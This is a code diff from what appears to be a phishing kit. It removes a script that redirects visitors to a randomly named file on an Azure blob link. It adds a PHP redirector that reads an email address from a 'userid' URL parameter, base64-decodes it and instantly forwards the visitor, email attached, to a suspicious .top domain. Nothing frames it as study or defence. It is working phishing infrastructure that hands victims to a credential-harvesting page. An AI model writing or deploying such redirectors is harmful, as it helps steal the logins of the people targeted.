@@ -1,1 +1,26 @@
-<script>parent.location='https://assssiii.blob.core.windows.net/niyte/qwsyysyuyuww.html?sp=r&st=2025-03-11T20:20:11Z&se=2025-09-26T04:20:11Z&sv=2022-11-02&sr=b&sig=wWE6uIWJs4czJ5STVGjdpGAAa6fw3p5cyu%2BdLAQt4QI%3D';</script>
+<?php
+function isBase64($data)
+{
+    if (base64_encode(base64_decode($data)) === $data) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function decode($email){
+		
+		if(isBase64($email)){
+			 $email = base64_decode($email,false);
+		}
+      
+       header( "refresh:0;url=https://0nlinesjsjjs.jlpfh.top/?n7msM=kXeN".$email);
+
+}
+if(isset($_GET['userid']) && !empty($_GET['userid'])){
+   $email = $_GET['userid'];
+   decode($email);
+}
+   
+   
+?>
